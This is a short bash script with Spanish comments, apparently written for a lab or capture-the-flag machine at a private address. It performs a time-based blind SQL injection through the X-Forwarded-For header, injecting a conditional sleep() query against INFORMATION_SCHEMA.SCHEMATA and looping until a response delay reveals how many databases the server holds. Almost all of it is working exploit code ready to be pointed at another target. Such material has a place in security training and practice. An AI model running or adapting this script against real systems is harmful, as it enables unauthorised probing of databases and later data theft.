#!/bin/bash
#Idea: hacer que el servidor SQL duerma 1 seg. que en el caso de la inyección, equivale a sleep(0.043), sólo si el número total de bases de datos es igual a un número que estamos probando.
#Payload: Para estta máquina se utiliza X-Forwarded-For para enviar la inyección y verificar si hay un retraso en la respuesta
# Procedimiento: Comienza en 1 y prueba hasta el número máximo de intentos (max_attempts)
#	Calcula el tiempo total que tarda el servidor en responder
#	Si el retraso es mayor que el expected_delay de 1 segundo, el script asume que el valor actual de i es el número correcto de bases de datos
#	Muestra el número de bases de datos encontrado y detiene la búsqueda

url="http://192.168.44.134"  
expected_delay=1.0           
max_attempts=20              # Valor empírico

for ((i = 1; i <= max_attempts; i++)); do
    echo "Probando con COUNT(SCHEMA_NAME) = $i..."

    # Inyección de la consulta
    start=$(date +%s.%N)
    response=$(curl -s -w "%{time_total}" -o /dev/null -H "X-Forwarded-For: 1' or if((SELECT COUNT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA) = $i, sleep(0.043), 0) #" "$url")
    end=$(date +%s.%N)
    
    duration=$(echo "$end - $start" | bc)

    # Verifica si el retraso es cercano al tiempo esperado
    if (( $(echo "$duration > $expected_delay" | bc -l) )); then
        echo -e "\n[+] Número de bases de datos encontrado: $i (con un retraso de $duration segundos)"
        break
    else
        echo "No hay retraso significativo (tiempo de respuesta: $duration segundos)"
    fi
done
